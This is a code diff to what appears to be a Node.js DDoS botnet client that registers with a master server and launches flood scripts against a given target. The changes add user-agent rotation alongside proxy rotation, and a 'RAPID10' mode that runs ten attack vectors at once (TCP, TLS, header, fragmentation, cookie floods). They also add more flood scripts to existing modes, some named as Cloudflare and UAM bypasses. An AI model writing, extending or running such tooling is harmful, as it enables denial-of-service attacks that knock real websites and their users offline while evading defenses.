@@ -17,7 +17,9 @@ let registrationAttempts = 0;
 let activeProcesses = [];
 let isBlocked = false;
 let proxyList = [];
+let uaList = [];
 let currentProxyIndex = 0;
+let currentUaIndex = 0;
 let requestCount = 0;
 let totalRequests = 0;
 let currentAttack = null;
@@ -119,14 +121,43 @@ async function startBot() {
         const data = fs.readFileSync('proxy.txt', 'utf8');
         proxyList = data.split('\n')
           .map(line => line.trim())
-          .filter(line => line && !line.startsWith('#'));
+          .filter(line => line && !line.startsWith('#') && line.includes(':'));
         console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
       } else {
-        console.log(color('[PROXY] No proxy.txt found, running without proxies', colors.yellow));
-        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
+        console.log(color('[PROXY] No proxy.txt found, creating template', colors.yellow));
+        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port\n# Example: 192.168.1.1:8080\n');
       }
     } catch (error) {
       console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
+    }
+  }
+
+  // ========== USER AGENT MANAGEMENT ==========
+  function loadUserAgents() {
+    try {
+      if (fs.existsSync('ua.txt')) {
+        const data = fs.readFileSync('ua.txt', 'utf8');
+        uaList = data.split('\n')
+          .map(line => line.trim())
+          .filter(line => line && !line.startsWith('#'));
+        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
+      } else {
+        console.log(color('[UA] No ua.txt found, creating template with default UAs', colors.yellow));
+        const defaultUAs = [
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
+        ];
+        fs.writeFileSync('ua.txt', '# User Agents - one per line\n' + defaultUAs.join('\n'));
+        uaList = defaultUAs;
+      }
+    } catch (error) {
+      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
     }
   }
 
@@ -137,6 +168,13 @@ async function startBot() {
     return proxy;
   }
 
+  function getNextUserAgent() {
+    if (uaList.length === 0) return randomUseragent.getRandom();
+    const ua = uaList[currentUaIndex];
+    currentUaIndex = (currentUaIndex + 1) % uaList.length;
+    return ua;
+  }
+
   function createProxyAgent(targetUrl) {
     const proxy = getNextProxy();
     if (!proxy) return null;
@@ -145,15 +183,12 @@ async function startBot() {
       if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
         return new SocksProxyAgent(proxy);
       } else {
+        // Format: ip:port
         return new HttpsProxyAgent(`http://${proxy}`);
       }
     } catch (error) {
       return null;
     }
-  }
-
-  function getRandomUserAgent() {
-    return randomUseragent.getRandom();
   }
 
   // ========== HTTPS AGENT FOR WINDOWS ==========
@@ -209,6 +244,7 @@ async function startBot() {
       console.log(color(`💓 Heartbeat: Every 30 seconds`, colors.blue));
       console.log(color(`📊 Reports:  Every 60 seconds`, colors.green));
       console.log(color(`🕸️  Proxies:   ${proxyList.length} loaded`, colors.cyan));
+      console.log(color(`👤 User Agents: ${uaList.length} loaded`, colors.green));
       console.log(color('='.repeat(50), colors.cyan) + '\n');
       
       return publicIP;
@@ -238,7 +274,6 @@ async function startBot() {
     try {
       console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
       
-      // EXACT payload format that server expects
       const payload = { 
         url: myBotUrl 
       };
@@ -275,7 +310,6 @@ async function startBot() {
       console.log(color(`❌ Registration failed:`, colors.red));
       
       if (error.response) {
-        // Server responded with error
         console.log(color(`   Status: ${error.response.status}`, colors.yellow));
         console.log(color(`   Data: ${JSON.stringify(error.response.data)}`, colors.red));
         console.log(color(`   Headers: ${JSON.stringify(error.response.headers)}`, colors.gray));
@@ -286,11 +320,9 @@ async function startBot() {
           process.exit(0);
         }
       } else if (error.request) {
-        // No response received
         console.log(color(`   No response from server`, colors.yellow));
         console.log(color(`   Is the server running at ${MASTER_SERVER}?`, colors.yellow));
       } else {
-        // Other error
         console.log(color(`   Error: ${error.message}`, colors.red));
       }
       
@@ -363,10 +395,11 @@ async function startBot() {
       lastReportedCount: 0
     };
     requestCount = 0;
+    attackStartTime = Date.now();
 
     const execWithLog = (cmd) => {
       console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
-      const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
+      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
         if (error) {
           console.error(color(`❌ Error: ${error.message}`, colors.red));
           return;
@@ -374,14 +407,18 @@ async function startBot() {
         if (stdout) {
           const lines = stdout.split('\n');
           lines.forEach(line => {
-            if (line.includes('Request') || line.includes('GET') || line.includes('POST')) {
+            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
+                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
               requestCount++;
               totalRequests++;
             }
           });
-          console.log(stdout);
+          // Only log first few lines to avoid spam
+          if (lines.length > 0 && lines[0].length > 0) {
+            console.log(color(`📤 ${lines[0].substring(0, 100)}`, colors.gray));
+          }
         }
-        if (stderr) console.error(stderr);
+        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
       });
       
       activeProcesses.push(proc);
@@ -389,13 +426,64 @@ async function startBot() {
       setTimeout(() => {
         const index = activeProcesses.indexOf(proc);
         if (index > -1) {
+          try {
+            process.kill(-proc.pid);
+          } catch (e) {}
           activeProcesses.splice(index, 1);
         }
       }, parseInt(time) * 1000 + 5000);
     };
 
-    // Attack methods
-    if (methods === 'CF-BYPASS') {
+    // Attack methods - UPDATED WITH R10 SERIES connected to proxy.txt and ua.txt
+    if (methods === 'RAPID10') {
+      console.log(color(`🔥🔥 RAPID10: LAUNCHING ALL 10 VECTORS 🔥🔥`, colors.redBright));
+      console.log(color(`Target: ${target} | Duration: ${time}s | Proxies: ${proxyList.length} | UAs: ${uaList.length}`, colors.yellow));
+      
+      // RAPID10 - ALL METHODS with proxy and UA support
+      execWithLog(`node methods/r10-rapid.js ${target} ${time} 10000 proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-header.js ${target} ${time} 5000 proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
+      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 1000 proxy.txt ua.txt`);
+      
+      console.log(color(`✅ RAPID10: ALL 10 ATTACK VECTORS DEPLOYED`, colors.green));
+    }
+    else if (methods === 'R10-RAPID') {
+      execWithLog(`node methods/r10-rapid.js ${target} ${time} 10000 proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-TCP') {
+      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-TLS') {
+      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-CONN') {
+      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-HEADER') {
+      execWithLog(`node methods/r10-header.js ${target} ${time} 5000 proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-FRAG') {
+      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-PIPE') {
+      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-COOKIE') {
+      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-MIXED') {
+      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
+    }
+    else if (methods === 'R10-LOWCPU') {
+      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 1000 proxy.txt ua.txt`);
+    }
+    else if (methods === 'CF-BYPASS') {
       execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
     }
     else if (methods === 'MODERN-FLOOD') {
@@ -404,6 +492,8 @@ async function startBot() {
     else if (methods === 'HTTP-SICARIO') {
       execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
       execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
     }
     else if (methods === 'RAW-HTTP') {
       execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
@@ -412,10 +502,16 @@ async function startBot() {
     else if (methods === 'R9') {
       execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
       execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
     }
     else if (methods === 'PRIV-TOR') {
       execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
       execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
     }
     else if (methods === 'HOLD-PANEL') {
       execWithLog(`node methods/http-panel.js ${target} ${time}`);
@@ -423,7 +519,12 @@ async function startBot() {
     else if (methods === 'R1') {
       execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
       execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
       execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
+      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
     }
     else if (methods === 'UAM') {
       execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
@@ -439,6 +540,8 @@ async function startBot() {
       status: 'online',
       uptime: process.uptime(),
       totalRequests,
+      proxies: proxyList.length,
+      userAgents: uaList.length,
       currentAttack: currentAttack ? {
         target: currentAttack.target,
         method: currentAttack.methods,
@@ -455,7 +558,8 @@ async function startBot() {
       uptime: process.uptime(),
       timestamp: Date.now(),
       status: 'online',
-      totalRequests
+      totalRequests,
+      proxies: proxyList.length
     });
   });
 
@@ -464,6 +568,14 @@ async function startBot() {
     res.json({ 
       total: proxyList.length,
       proxies: proxyList.slice(0, 10)
+    });
+  });
+
+  // ========== UA ENDPOINT ==========
+  app.get('/useragents', (req, res) => {
+    res.json({ 
+      total: uaList.length,
+      userAgents: uaList.slice(0, 10)
     });
   });
 
@@ -481,6 +593,7 @@ async function startBot() {
   // ========== START SERVER ==========
   app.listen(PORT, async () => {
     loadProxies();
+    loadUserAgents();
     await fetchData();
     
     console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
